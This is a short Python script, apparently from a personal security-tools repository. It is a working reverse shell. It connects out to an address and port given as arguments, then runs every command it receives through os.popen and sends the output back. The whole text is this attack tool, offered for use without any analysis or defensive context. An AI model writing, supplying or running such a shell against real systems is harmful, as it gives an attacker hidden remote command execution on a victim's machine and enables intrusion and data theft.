#rusty-s3c/cesar
try:
    import socket, os, sys
except:
    print("Error. You need these libraries installed: \nsocket\nos\nsys")
    exit()
try:
    addr = sys.argv[1]
    port = int(sys.argv[2])
except:
    print("Error. Usage: %s <addr> <port>" %sys.argv[0])
    exit()
def cli(address, port):
    #create the tcp client socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address, port))
    while True:
        try:
            command = s.recv(8192)
            command = command.decode() #bytes to string; we receive data in bytes
            command = os.popen(command).read()
            s.send(command.encode())
        except:
            s.close()
cli(addr, port)
